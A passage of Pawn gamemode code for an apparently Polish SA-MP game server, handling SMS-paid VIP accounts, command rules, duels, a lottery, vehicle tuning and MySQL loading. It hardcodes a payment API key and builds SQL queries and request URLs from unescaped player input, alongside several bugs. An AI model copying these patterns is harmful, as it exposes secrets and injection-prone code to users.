						InfoBox(playerid, ""C_O"Ten rodzaj konta VIP mo¿esz kupiæ dopiero po wykorzystaniu aktualnego.");
						return 1;
					}
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					format(bstrx, sizeof bstrx, ""C_O"Kupujesz konto VIP na "C_B"miesi¹c"C_O", czyli "C_B"30 "C_O"dni\nPamiêtaj, ¿e w tym rodzaju konta nie jest brana pod uwagê przegrana iloœæ czasu.\n\n");
					strcat(bstrx, "Wyœlij SMS o treœci {FFFF00}AA.SP"C_O" na numer "C_B"7936"C_O"\n\n");
					strcat(bstrx, "W razie pytañ zapraszamy na forum "C_B"Polski TOP Serwer\n");
					Dialog(playerid, 756, DIALOG_INPUT, bstrx, "KUP", "Anuluj");

				}
			}
		}
		case 756:
		{
			if(!response) return 1;

			new id = GetPVarInt(playerid, "vipSMS");
			if(id != 9 && id != 10)
			{
				format(strx, sizeof strx, "SELECT `vip` FROM `players` WHERE `nick` = '%s'", pName[playerid]);
				mysql_query(strx);
				mysql_store_result();
				new vip[30];
				mysql_fetch_field("vip", vip);
				mysql_free_result();
				SetPVarInt(playerid, "vipActiv", strval(vip));
			}
			#define SMS_API "1d5e1ed2d661be18861403d5d"
			new reqUrl[255];
			format(reqUrl, 255, "admin.serverproject.pl/api/smsapi.php?key=%s&amount=4&code=%s", SMS_API, inputtext);
			HTTP(playerid, HTTP_GET, reqUrl, "", "checkVIPCode");
		}
		case 755:
		{
			if(!response) return 1;

			if(strlen(inputtext) < 5) return InfoBox(playerid, "{FFFFFF}Niepoprawny telekod.");

			new id = GetPVarInt(playerid, "vipSMS");
			if(id != 9 && id != 10)
			{
				format(strx, sizeof strx, "SELECT `lol` FROM `players` WHERE `nick` = '%s'", pName[playerid]);
				mysql_query(strx);
				mysql_store_result();
				new vip[30];
				mysql_fetch_field("vip", vip);
				mysql_free_result();
				SetPVarInt(playerid, "vipActiv", strval(vip));
			}
			format(strx, sizeof strx, "exgame.pl/checkcode.php?t=%d&nick=%s&code=%s", id, pName[playerid], inputtext);
			HTTP(playerid, HTTP_GET,  strx, "", "HTTP_F");
			InfoBox(playerid, "\nWeryfikacja kodu...\n");
			SetTimerEx("ActivateVIP", 8000, 0, "d", playerid);
		}
	}
	return 1;
}

forward checkVIPCode(playerid, response_code, data[]);
public checkVIPCode(playerid, response_code, data[])
{
    if(response_code != 200)
	{
        PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
		InfoBox(playerid, ""C_B"Wyst¹pi³ b³¹d z serwerem!");
		return 0;
	}
	if(strfind(data,"ok",false) != -1)
	{
        PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
		InfoBox(playerid, ""C_O"Kod jest poprawny, konto "C_B"VIP "C_O"przyznane, wejdŸ jeszcze raz na serwer.");
		SetPVarInt(playerid, "VIP", 1);
		if(Vip[playerid] == false)
		mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'vips'");
		new str[170];
		format(str,sizeof str,"Update players SET vip = IF(vip>NOW(), vip, NOW())+INTERVAL 31 DAY WHERE nick='%s' LIMIT 1",pName[playerid]);
		mysql_query(str);
		return 1;
	}
	PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
	InfoBox(playerid, ""C_B"Wprowadzony kod jest niepoprawny!");
    return 0;
}
forward HTTP_A(index, response_code, data[]);
public HTTP_A(index, response_code, data[])
{
	Ananas = strval(data);
    AnnOFF = 1;
	return 1;
}
forward HTTP_F(index, response_code, data[]);
public HTTP_F(index, response_code, data[])
{
	printf("HTTPVIP: %s | %d | %s", pName[index], response_code, data);
	return 1;
}

forward ActivateVIP(playerid);
public ActivateVIP(playerid)
{
	new id = GetPVarInt(playerid, "vipSMS");
	format(strx, sizeof strx, "SELECT `lol` FROM `players` WHERE `nick` = '%s'", pName[playerid]);
	mysql_query(strx);
	mysql_store_result();
	new vip[30];
	mysql_fetch_field("vip", vip);
	mysql_free_result();

	if(id == 9)
	{
		if(IsNumeric(vip))
		{
			InfoBox(playerid, "Nieprawid³owy telekod! Spróbuj wpisaæ kod jeszcze raz!");
		}else
		{
			InfoBox(playerid, "Konto VIP zosta³o przyznane!");
			SetPVarInt(playerid, "VIP", 1);
			mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'lol'");
		}
	}else{
	    if(strval(vip) == 0 || strval(vip) <= GetPVarInt(playerid, "vipActiv"))
	    {
	        InfoBox(playerid, "Nieprawid³owy telekod! Spróbuj wpisaæ kod jeszcze raz!");
	    }else
	    {
	        InfoBox(playerid, "Konto VIP zosta³o przyznane!");
			SetPVarInt(playerid, "VIP", 1);
			mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'lol'");
	    }
	}
    return 1;
}
AllowCommand(cmd[])
{
	if(!strcmp(cmd, "/ban", true, 4)) return 1;
	if(!strcmp(cmd, "/kill", true, 5)) return 1;
	if(!strcmp(cmd, "/exitdm", true, 7)) return 1;
	if(!strcmp(cmd, "/kick", true, 5)) return 1;
	if(!strcmp(cmd, "/mute", true, 5)) return 1;
	if(!strcmp(cmd, "/jail", true, 5)) return 1;
	if(!strcmp(cmd, "/unfreeze", true, 9)) return 1;
	if(!strcmp(cmd, "/freeze", true, 7)) return 1;
	if(!strcmp(cmd, "/giveweapon", true, 11)) return 1;
	if(!strcmp(cmd, "/sethp", true, 6)) return 1;
	if(!strcmp(cmd, "/setarmor", true, 9)) return 1;
	if(!strcmp(cmd, "/raport", true, 7)) return 1;
	if(!strcmp(cmd, "/report", true, 7)) return 1;
	if(!strcmp(cmd, "/pm", true, 3)) return 1;
	if(!strcmp(cmd, "/resrace", true, 8)) return 1;
	if(!strcmp(cmd, "/exitrace", true, 9)) return 1;
	if(!strcmp(cmd, "/exittruck", true, 10)) return 1;
	if(!strcmp(cmd, "/lock", true, 5)) return 1;
	if(!strcmp(cmd, "/unlock", true, 7)) return 1;
	if(!strcmp(cmd, "/dzien", true, 6)) return 1;
	if(!strcmp(cmd, "/noc", true, 4)) return 1;
	if(!strcmp(cmd, "/skin", true, 5)) return 1;
	if(!strcmp(cmd, "/explode", true, 8)) return 1;
	if(!strcmp(cmd, "/rozladuj", true, 9)) return 1;
	if(!strcmp(cmd, "/reg", true, 4)) return 1;
	if(!strcmp(cmd, "/serwer", true, 7)) return 1;
	if(!strcmp(cmd, "/pw", true, 3)) return 1;
	if(!strcmp(cmd, "/pmoff", true, 6)) return 1;
	if(!strcmp(cmd, "/pmon", true, 5)) return 1;
	if(!strcmp(cmd, "/eye", true, 4)) return 1;
	if(!strcmp(cmd, "/pmeye", true, 6)) return 1;
	if(!strcmp(cmd, "/getweapon", true, 10)) return 1;
	if(!strcmp(cmd, "/givejetpack", true, 12)) return 1;
	if(!strcmp(cmd, "/cb", true, 3)) return 1;
	if(!strcmp(cmd, "/tune", true, 5)) return 1;
	if(!strcmp(cmd, "/me", true, 3)) return 1;
	return 0;
}

public OnPlayerCommandReceived(playerid, cmdtext[])
{
	if(GetPlayerState(playerid) == PLAYER_STATE_WASTED)
 	    return 0;

    if(GetPVarInt(playerid, "pJailed") == 1)
	{
	    SCM(playerid, 0xFFFFFFFF, "Jesteœ w wiêzieniu! Tutaj nie mo¿esz korzystaæ z komend!");
	    return 0;
	}
	if(pAFK[playerid] != 0 && strcmp(cmdtext, "/jj", true) != 0)
	{
 		SCM(playerid, 0xFFFFFFFF, "Wpisz "C_B"/jj"C_O", aby aktywowaæ dzia³ania na serwerze.");
		return 0;
	}
	if(pInFun[playerid] == 1 && GetPlayerVirtualWorld(playerid) != 0 && AllowCommand(cmdtext) == 0)
	{
	    SCM(playerid, 0xFFFFFFFF, "Nie mo¿esz teraz korzystaæ z komend!");
	    return 0;
	}
	if(GetPVarInt(playerid, "RacePlayer") == 1 && AllowCommand(cmdtext) == 0)
	{
	    SCM(playerid, 0xFFFFFFFF, "Nie mo¿esz korzystaæ z komend podczas wyœcigu!");
	    return 0;
	}
	if(IsPlayerInDM(playerid) && AllowCommand(cmdtext) == 0)
	{
	    SCM(playerid, 0xFFFFFFFF, "Nie mo¿esz korzystaæ z komend w strefie DM! Wpisz "C_B"/exitdm"C_O" aby wyjœæ");
	    return 0;
	}

	return 1;
}

public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	if(!success)
	{
	    new str[1000];
	    format(str, sizeof str, ""C_O"Podana przez Ciebie komenda "C_B"%s "C_O"nie istnieje. Zapoznaj siê z komendami!", cmdtext);
		ShowPlayerDialog(playerid, 31, DIALOG_STYLE_MSGBOX, "{EAB171}B³¹d!", str, "Pomoc", "");
    	return 1;
	}else if(strcmp(cmdtext,"/pm", true, 3) != 0)
	{
	   	format(strx, sizeof strx, "%s (%d): %s", pName[playerid], playerid, cmdtext);
		WriteLog(strx);
        format(strx, sizeof strx, "[EYE]:{DD0000} %s >> %s", pName[playerid], cmdtext);
 		pLoop(i)
 		{
		    if((i) && i != playerid && GetPVarInt(i, "eye") == 1) SCM(i, 0xBB0000FF, strx);
		}
	}
	return 1;
}

forward HTTP_AC(index, response_code, data[]);
public HTTP_AC(index, response_code, data[])
{
	AnnOFF = strval(data);
	Ananas = 1;
	return 1;
}

forward DualOdlicz(playerid, player, count);
public DualOdlicz(playerid, player, count)
{
	if(count > 0)
	{
		format(strx, sizeof strx, "~r~~h~%d", 3);
    	ShowGameDraw(playerid, strx, 1000);
    	ShowGameDraw(player, strx, 1000);
    	SetTimerEx("DualOdlicz", 1000, 0, "ddd", playerid, player, count-1);
	}else{
		ShowGameDraw(playerid, "Start!", 1000);
    	ShowGameDraw(player, "Start!", 1000);
    	TogglePlayerControllable(player, 1);
    	TogglePlayerControllable(playerid, 1);
	}
	return 1;
}
forward DualTimeout(playerid, player);
public DualTimeout(playerid, player)
{
	if(GetPVarInt(playerid, "Walczy") == 0)
	{
       	SetPVarInt(playerid, "pWalka", -1);
		SetPVarInt(playerid, "pDWeap1", 0);
		SetPVarInt(playerid, "pDWeap2", 0);
		SetPVarInt(playerid, "pDExp", 0);
		format(strx, sizeof strx, ""C_O"Gracz "C_B"%s "C_O"odrzuci³ twoje zaproszenie!", pName[player]);
		InfoBox(playerid, strx);
	}
	if(GetPVarInt(player, "Walczy") == 0)
	{
	    SetPVarInt(player, "pWalka", -1);
		SetPVarInt(player, "pDWeap1", 0);
		SetPVarInt(player, "pDWeap2", 0);
		SetPVarInt(player, "pDExp", 0);
	}
	return 1;
}

forward ExplodeTimer(admin, player, Float:hp);
public ExplodeTimer(admin, player, Float:hp)
{
	new Float:nhp;
	GetPlayerHealth(player, nhp);
	if(nhp < hp || GetPVarInt(player, "explode") == 0)
	{
	    SCM(admin, -1, "[EXPLODE]:{FFAA00} Graczowi spad³o HP lub jest zabity.");
		format(strx, sizeof strx, "[EXPLODE] %s - graczowi spadlo HP.", player);
		WriteLog(strx);

	}else{
	    SCM(admin, -1, "{FFAA00} Postêpowanie administracyjne - czynnoœæ: explode.");
	    SCM(admin, -1, "[EXPLODE]:{FFAA00} Graczowi nie spad³o HP.");
	    SCM(admin, -1, "[EXPLODE]:{FFAA00} Upewnij siê ¿e gracz nie posiada god'a od administratora.");
	   	format(strx, sizeof strx, "[EXPLODE] %s - graczowi nie spadlo HP.", player);
		WriteLog(strx);

	}
	return 1;
}

forward CountDown();
public CountDown()
{
	new mstr[64];
	Odliczanie--;
    if(Odliczanie > 0)
    {
    	format(mstr, 64, "~r~~h~%d~w~!", Odliczanie);
    	TextDrawSetString(CountDraw, mstr);
        SetTimer("CountDown", 1000, 0);
	}else if(Odliczanie == 0)
	{
	    TextDrawSetString(CountDraw, "~b~~h~START~w~!!!");
		SetTimer("CountDown", 1500, 0);
		pLoop(i)
		{
			if(GetPlayerVirtualWorld(i) == 0 && GetPlayerInterior(i) == 0)
	    	{
	        	if(IsPlayerInRangeOfPoint(i, 40.0,OdliczPos[0],OdliczPos[1],OdliczPos[2]) == 1)
	        	{
					PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
	        	}
			}
		}
	}else{
	    TextDrawHideForAll(CountDraw);
	    Odliczanie = 0;
	}
	return 1;
}

forward Losowanko(playerid);
public Losowanko(playerid)
{
	if(GetPlayerVirtualWorld(playerid) > 0 && GetPlayerVirtualWorld(playerid) < 500) return 0;

	mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'los'");

	switch(random(8))
	{
		case 0:
			format(strx, sizeof(strx), ""C_B"%s "C_O"nic nie wygra³ w "C_B"/los!", pName[playerid]);
		case 1:
		{
		    new x = random(15);
			GivePlayerScore(playerid, x);
			format(strx, sizeof(strx), ""C_B"%s{00AAFF} wygra³ "C_B"%dexp "C_O"w "C_B"/los", pName[playerid],x);
		}
		case 2:
		{
		    new i = random(10000);
			GivePlayerMoney(playerid, i);
			format(strx, sizeof(strx), ""C_B"%s{00AAFF} wygra³ "C_B"%d$ "C_O"w "C_B"/los", pName[playerid],i);
		}
		case 3:
		{
			SetPlayerPos(playerid, 2395.6543,1000.5044,520.0);
			SetPlayerInterior(playerid, 0);
			ResetPlayerWeapons(playerid);
			format(strx, sizeof(strx), ""C_B"%s"C_O" wygra³ skok bez spadochronu w "C_B"/los!", pName[playerid]);
		}
		case 4:
		{
			SetPlayerArmour(playerid, 100.0);
			format(strx, sizeof(strx), ""C_B"%s"C_O" wygra³ pancerz w "C_B"/los", pName[playerid]);
		}
		case 5:
		{
			KillPlayer(playerid);
			format(strx, sizeof(strx), ""C_B"%s"C_O" wygra³ kostuchê w "C_B"/los!", pName[playerid]);
		}
		case 6:
		{
			GivePlayerScore(playerid,-15);
			format(strx, sizeof(strx), ""C_B"%s"C_O" straci³ "C_B"15"C_O"exp w "C_B"/los!", pName[playerid]);
		}
		case 7:
		{
		    GivePlayerWeapon(playerid, 24, 999);
		    format(strx, sizeof(strx), ""C_B"%s"C_O" wygra³ Deagle w "C_B"/los!", pName[playerid]);
		}
	}
	SCMToAll(-1, strx);
	return 1;
}
//--

forward WylanczAnn();
public WylanczAnn()
{
	KillTimer(AnnTim);
	AnnON=0;
	TextDrawHideForAll(AnnTD);
	return 1;
}

AllSkins()
{
    for(new skinid; skinid < 300; skinid++)
	{
		if (skinid >= 0 || skinid != 74)
	    {
		   	AddPlayerClass(skinid,0.0,0.0,8.0,0.0,0,0,0,0,0,0);
		}
	}
	return 1;
}

GetVehicleModelIdByName(modelname[])
{
    for(new i = 400; i <= 611; i++)
    {
    	if(strfind(VehicleNames[i-400],modelname, true) != -1)
    	{
    	    return i;
    	}
    }
	return 0;
}

IsNumeric(const string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if (string[i] > '9' || string[i] < '0') return 0;
	}
	return 1;
}
GetVehicleName(model)
{
	new mstr[64];
	format(mstr, sizeof(mstr), VehicleNames[model-400]);
	return mstr;
}
NoRampCar(vid)
{
	switch(GetVehicleModel(vid))
	{
		case 592:return 0;//
		case 577:return 0;//
		case 511:return 0;//
		case 512:return 0;//
		case 593:return 0;//
		case 520:return 0;//
		case 553:return 0;//
		case 476:return 0;//
		case 519:return 0;//
		case 460:return 0;//
		case 548:return 0;//
		case 425:return 0;//
		case 417:return 0;//
		case 487:return 0;//
		case 488:return 0;//
		case 497:return 0;//
		case 563:return 0;//
		case 447:return 0;//
		case 469:return 0;//
		case 513:return 0;//
		case 441:return 0;//
		case 501:return 0;//
        case 564:return 0;//
        case 594:return 0;//
        case 464:return 0;//
        case 465:return 0;//
	}
	return 1;
}

forward RemoveRamp(playerid, objs);
public RemoveRamp(playerid, objs)
{
	SetPVarInt(playerid, "pRampUse", 0);
	DestroyPlayerObject(playerid, objs);
	return 1;
}
GiveStandartWeapon(i)
{
	GivePlayerWeapon(i, pSpawnWeapon[i][0], 1);
	GivePlayerWeapon(i, pSpawnWeapon[i][1], 4000);
	GivePlayerWeapon(i, pSpawnWeapon[i][2], 4000);
	GivePlayerWeapon(i, pSpawnWeapon[i][3], 4000);
	GivePlayerWeapon(i, pSpawnWeapon[i][4], 4000);
	GivePlayerWeapon(i, pSpawnWeapon[i][5], 4000);
	GivePlayerWeapon(i, 43, 100);
	return 1;
}

CreateStreamObject(modelid,Float:X,Float:Y,Float:Z,Float:rX,Float:rY,Float:rZ)
	return CreateDynamicObjectEx(modelid,X,Y,Z,rX,rY,rZ,200.0,350.0, {0,1}, {0});

AddVehComp(vehicleid, ...)
{
	for(new n = 1; n < numargs(); n++)
		AddVehicleComponent(vehicleid, getarg(n, 0));
}
HydraulicVehicle(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 400,401,404,405,410,415,418,420,
			 422,421,426,436,439,477,540,542,
			 546,547,549,550,551,558,559,560,
			 561,562,567,575,576,580,585,589,
			 600,603,478,489,491,492,496,500,
			 505,516,517,518,527,529,534,535,
			 429,602,402,541,587,565,494,502,
			 503,411,475,506,451,588,488,445,
			 504,568,495,507,419,536,412,566,
			 413,480,533,555,424,431,438,437,
			 490,596,598,597,599,467: return 1;

		default: return 0;
	}
	return 0;
}

TuneVehicle(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 400:
		AddVehComp(vehicleid,1009,1010,1013,1018,1019,1020,1021,1024);
		case 401:
		AddVehComp(vehicleid,1001,1003,1004,1005,1006,1007,1009,1010,1013,1017,1019,10201142,1143,1144,1145);
		case 404:
		AddVehComp(vehicleid,1000,1002,1007,1009,1010,1013,1016,1017,1019,1020,1021);
		case 405:
		AddVehComp(vehicleid,1000,1001,1009,1010,1014,1018,1019,1020,1021,1023);
		case 410:
		AddVehComp(vehicleid,1001,1003,1007,1009,1010,1013,1017,1019,1020,1021,1023,1024);
		case 415:
		AddVehComp(vehicleid,1001,1003,1007,1009,1010,1017,1018,1019,1023);
		case 418:
		AddVehComp(vehicleid,1002,1006,1009,1010,1016,1020,1021);
		case 420:
		AddVehComp(vehicleid,1087,1001,1003,1004,1005,1009,1010,1019,1021);
		case 421:
		AddVehComp(vehicleid,1000,1009,1010,1014,1016,1018,1019,1020,1021,1023);
		case 422:
		AddVehComp(vehicleid,1007,1009,1010,1013,1017,1019,1020,1021);
		case 426:
		AddVehComp(vehicleid,1001,1003,1004,1005,1006,1009,1010,1019,1021);
		case 436:
		AddVehComp(vehicleid,1001,1003,1006,1007,1009,1010,1013,1017,1019,1020,1021,1022);
		case 439:
		AddVehComp(vehicleid,1001,1003,1007,1009,1010,1013,1017,1023,1142,1143,1144,1145);
		case 477:
		AddVehComp(vehicleid,1006,1007,1009,1010,1017,1018,1019,1020,1021);
		case 478:
		AddVehComp(vehicleid,1004,1005,1009,1010,1012,1013,1020,1021,1022,1024);
		case 489:
		AddVehComp(vehicleid,1000,1002,1004,1005,1006,1009,1010,1013,1016,1018,1019,1020,1024);
		case 491:
		AddVehComp(vehicleid,1003,1007,1009,1010,1014,1017,1018,1019,1020,1021,1023,1142,1143,1144,1145);
		case 492:
		AddVehComp(vehicleid,1000,1004,1005,1006,1009,1010,1016);
		case 496:
		AddVehComp(vehicleid,1001,1002,1003,1006,1007,1009,1010,1011,1017,1019,1020,1023);
		case 500:
		AddVehComp(vehicleid,1009,1010,1013,1019,1020,1021,1024);
		case 505:
		AddVehComp(vehicleid,1000,1002,1004,1005,1006,1009,1010,1013,1016,1018,1019,1020,1024);
		case 516:
		AddVehComp(vehicleid,1000,1002,1004,1007,1009,1010,1015,1016,1017,1018,1019,1020,1021);
		case 517:
		AddVehComp(vehicleid,1002,1003,1007,1009,1010,1016,1017,1018,1019,1020,1023,1142,1143,1144,1145);
		case 518:
		AddVehComp(vehicleid,1001,1003,1005,1006,1007,1009,1010,1013,1017,1018,1020,1023,1142,1143,1144,1145);
		case 527:
		AddVehComp(vehicleid,1001,1007,1009,1010,1014,1015,1017,1018,1020,1021);
		case 529:
		AddVehComp(vehicleid,1001,1003,1006,1007,1009,1010,1011,1012,1017,1018,1019,1020,1023);
		case 534:
		AddVehComp(vehicleid,1009,1010,1100,1101,1106,1122,1123,1124,1125,1126,1127,1178,1179,1180,1185);
		case 535:
		AddVehComp(vehicleid,1009,1010,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121);
		case 536:
		AddVehComp(vehicleid,1009,1010,1103,1104,1105,1107,1108,1128,1181,1182,1183,1184);
		case 540:
		AddVehComp(vehicleid,1001,1004,1006,1007,1009,1010,1017,1018,1019,1020,1023,1024,1142,1143,1144,1145);
		case 542:
		AddVehComp(vehicleid,1009,1010,1014,1015,1018,1019,1020,1021,1142,1143,1144,1145);
		case 546:
		AddVehComp(vehicleid,1001,1002,1004,1006,1007,1009,1010,1017,1018,1019,1023,1024,1142,1143,1144,1145);
		case 547:
		AddVehComp(vehicleid,1000,1003,1009,1010,1016,1018,1019,1020,1021);
		case 549:
		AddVehComp(vehicleid,1001,1003,1007,1009,1010,1011,1012,1017,1018,1019,1020,1023,1142,1143,1144,1145);
		case 550:
		AddVehComp(vehicleid,1001,1003,1004,1005,1006,1009,1010,1018,1019,1020,1023,1142,1143,1144,1145);
		case 551:
		AddVehComp(vehicleid,1002,1003,1005,1006,1009,1010,1016,1018,1019,1020,1021,1023);
		case 558:
		AddVehComp(vehicleid,1009,1010,1088,1089,1090,1091,1092,1093,1094,1095,1163,1164,1165,1166,1167,1168);
		case 559:
		AddVehComp(vehicleid,1009,1010,1065,1066,1067,1068,1069,1070,1071,1072,1158,1159,1160,1161,1162,1173);
		case 560:
		AddVehComp(vehicleid,1009,1010,1026,1027,1028,1029,1030,1031,1032,1033,1138,1139,1140,1141,1169,1170);
		case 561:
		AddVehComp(vehicleid,1009,1010,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1154,1155,1156,1157);
		case 562:
		AddVehComp(vehicleid,1009,1010,1034,1035,1036,1037,1038,1039,1040,1041,1146,1147,1148,1149,1171,1172);
		case 565:
		AddVehComp(vehicleid,1009,1010,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1150,1151,1152,1153);
		case 567:
		AddVehComp(vehicleid,1009,1010,1102,1129,1130,1131,1132,1133,1186,1187,1188,1189);
		case 575:
		AddVehComp(vehicleid,1009,1010,1042,1043,1044,1099,1174,1175,1176,1177);
		case 576:
		AddVehComp(vehicleid,1009,1010,1134,1135,1136,1137,1190,1191,1192,1193);
		case 580:
		AddVehComp(vehicleid,1001,1006,1007,1009,1010,1017,1018,1020,1023);
		case 585:
		AddVehComp(vehicleid,1001,1003,1006,1007,1009,1010,1013,1017,1018,1019,1020,1023,1142,1143,1144,1145);
		case 589:
		AddVehComp(vehicleid,1000,1004,1005,1006,1007,1009,1010,1013,1016,1017,1018,1020,1024,1142,1143,1144,1145);
		case 600:
		AddVehComp(vehicleid,1004,1005,1006,1007,1009,1010,1013,1017,1018,1020,1022);
		case 603:
		AddVehComp(vehicleid,1001,1006,1007,1009,1010,1017,1018,1019,1020,1023,1024,1142,1143,1144,1145);
        default:
        return 0;
	}
    return 1;
}

IsCar(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 416,445,602,485,568,429,499,424,
			536,496,504,422,609,498,401,575,
			518,402,541,482,431,438,457,527,
			483,524,415,542,589,480,596,599,
			597,598,578,486,507,562,585,427,
			419,587,490,528,533,544,407,565,
			455,530,526,466,604,492,474,434,
			502,503,494,579,545,411,546,559,
			508,571,400,403,517,410,551,500,
			418,572,423,516,582,467,404,514,
			603,600,413,426,436,547,489,441,
			594,564,515,479,534,505,442,440,
			475,543,605,495,567,428,405,535,
			458,580,439,561,409,560,550,506,
			601,574,566,549,420,459,576,583,
			451,558,552,540,491,412,478,421,
			529,555,456,554,477: return 1;
	}
	return 0;
}

IsIP(const ip[], bool:port = false)
{
    for(new cIP[2]; cIP[0] != strlen(ip); cIP[0]++)
    {
        switch(ip[cIP[0]])
        {
            case '.', ' ', ':', ',', '*', '/', ';', '\\', '|', '_' : continue;
            case '0' .. '9': cIP[1]++;
            default: cIP[1] = 0;
        }
        if((port == false) && (cIP[1] == 8))
        {
            new strex[8];
            strmid(strex, ip, cIP[0] - 7, cIP[0]);
            if(IsNumeric(strex))
                return 0;

            return 1;
        }
        if((port == true) && (cIP[1] == 12))
        {
            new strex[12];
            strmid(strex, ip, cIP[0] - 11, cIP[0]);
            if(IsNumeric(strex))
                return 0;

            return 1;
        }
    }
    return 0;
}



FetchMissleSlot(objectid)
{
	for(new i = 0; i < MAX_MISSLES; i ++)
	{
	    if(W_Pociski[i] == objectid) return i;
	}
	return -1;

}

IsInAircraft(playerid)
{
	if(!IsPlayerInAnyVehicle(playerid)) return false;
	new vehicleid = GetPlayerVehicleID(playerid);
	switch(GetVehicleModel(vehicleid))
	{
		case
	    	520,432: /* 520 - HYDRA # 432 RHINO */
		return true;

	}
	return false;
}

ResetMissles()
{
	for(new i = 0; i < MAX_MISSLES; i ++) W_Pociski[i] = -1;
}

FetchNextMissleSlot()
{
	for(new i = 0; i < MAX_MISSLES; i ++)
	{
	    if(W_Pociski[i] == -1) return i;
	}
	return -1;

}

SetObjectToFaceCords(objectid, Float:x1, Float:y1, Float:z1)
{
    new Float:x2,Float:y2,Float:z2;
    GetObjectPos(objectid, x2,y2,z2);

    new Float:DX = floatabs(x2-x1);
    new Float:DY = floatabs(y2-y1);
    new Float:DZ = floatabs(z2-z1);

    new Float:yaw = 0;
    new Float:pitch = 0;

    if(DY == 0 || DX == 0)
    {
    	if(DY == 0 && DX > 0)
		{
        	yaw = 00;
            pitch = 0;
		}
        else if(DY == 0 && DX < 0)
		{
			yaw = 180;
            pitch = 180;
		}
        else if(DY > 0 && DX == 0)
		{
			yaw = 90;
            pitch = 90;
		}
        else if(DY < 0 && DX == 0)
		{
        	yaw = 270;
            pitch = 270;
		}
        else if(DY == 0 && DX == 0)
		{
        	yaw = 0;
        	pitch = 0;
		}
    }
    else
    {
		yaw = atan(DX/DY);
		pitch = atan(floatsqroot(DX*DX + DZ*DZ) / DY);
        if(x1 > x2 && y1 <= y2)
		{
        	yaw = yaw + 90;
            pitch = pitch - 45;
		}
        else if(x1 <= x2 && y1 < y2)
		{
        	yaw = 90 - yaw;
            pitch = pitch - 45;
		}
        else if(x1 < x2 && y1 >= y2)
		{
            yaw = yaw - 90;
            pitch = pitch - 45;
		}
        else if(x1 >= x2 && y1 > y2)
		{
        	yaw = 270 - yaw;
            pitch = pitch + 315;
		}
        if(z1 < z2)
        {
    		pitch = 360-pitch;
        }
        SetObjectRot(objectid, 0, 0, yaw);
        SetObjectRot(objectid, 0, pitch, yaw+90);
	}
}

public OnDynamicObjectMoved(objectid)
{
	new slot = FetchMissleSlot(objectid);
	if(slot > -1)
	{
	    new Float:X, Float:Y, Float:Z;
	    GetDynamicObjectPos(objectid,X,Y,Z);
	    CreateExplosion(X,Y,Z,2,BLAST_RADIUS);
	    DestroyDynamicObject(objectid);
	    W_Pociski[slot] = -1;
	    return 1;
	}
	if(objectid == BallonID)
	{
		if(BallonPos == 0 || BallonPos == 3)
			return 1;

		if(BallonKierunek == 0)
	    {
			BallonPos++;
		}else{
		    BallonPos--;
		}

		if(BallonPos == 0 || BallonPos == 3)
		{
			MoveDynamicObject(objectid, PosBallon[BallonPos][0],PosBallon[BallonPos][1],PosBallon[BallonPos][2], 10.0);
		}else
		{
		    MoveDynamicObject(objectid, PosBallon[BallonPos][0],PosBallon[BallonPos][1],PosBallon[BallonPos][2], 22.0);
		}
		return 1;
	}
	if(objectid == BallonID2)
	{
		if(BallonPos2 == 0 || BallonPos2 == 8)
			return 1;


	    if(BallonKierunek2 == 0)
	    {
			BallonPos2++;
		}else{
		    BallonPos2--;
		}

		if(BallonPos2 != 3)
		{
			MoveDynamicObject(objectid, PosBallon2[BallonPos2][0],PosBallon2[BallonPos2][1],PosBallon2[BallonPos2][2], 8.0);
		}else
		{
		    MoveDynamicObject(objectid, PosBallon2[BallonPos2][0],PosBallon2[BallonPos2][1],PosBallon2[BallonPos2][2], 17.0);
		}
        return 1;
	}
	return 1;
}

GetOnlinePlayers()
{
	new i, c = 0;

	while(i != MAX_PLAYERS)
	{
	    if(IsPlayerConnected(i) && !IsPlayerNPC(i)) c++;

		i++;
	}
	return c;
}


StartSpec(playerid, specid)
{
    SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(specid));
    SetPlayerInterior(playerid,GetPlayerInterior(specid));
    SpecPlayer[playerid] = specid;
	if(IsPlayerInAnyVehicle(specid))
	{
	    TogglePlayerSpectating(playerid, 1);
		PlayerSpectateVehicle(playerid, GetPlayerVehicleID(specid));
	}else{
        TogglePlayerSpectating(playerid, 1);
	  	PlayerSpectatePlayer(playerid, specid);
	}
	format(strx, sizeof strx, "_~n~_~n~_~n~~w~%s - ID:%d", pName[specid], specid);
	ShowGameDraw(playerid, strx, 1000);
	return 1;
}

StopSpec(playerid)
{
	TogglePlayerSpectating(playerid, 0);
	ShowGameDraw(playerid, "~w~Stop Spec", 1000);
	SpecPlayer[playerid] = -1;
	return 1;
}

LoadFigures()
{
	new fparam[64], Float:pos[3], idf;
	new figur;
	mysql_query("SELECT `X`,`Y`,`Z`,`id` FROM `figurki`");
	mysql_store_result();
	while(mysql_fetch_row(fparam, "|"))
	{
	    sscanf(fparam, "p<|>fffd", pos[0],pos[1],pos[2], idf);
		Figurki_ID[figur] = idf;
		Figurki_PICKUP[figur] = CreatePickup(1276, 1, pos[0], pos[1], pos[2], 0);
		figur++;
	}
	mysql_free_result();
	return 1;
}

LoadRaces()
{
	format(strx, sizeof strx, "SELECT * FROM `race_id` LIMIT %d", MAX_RACE);
	mysql_query(strx);
	mysql_store_result();

	new param[200], rid, d3format[64];
	while(mysql_fetch_row(param, "|"))
	{
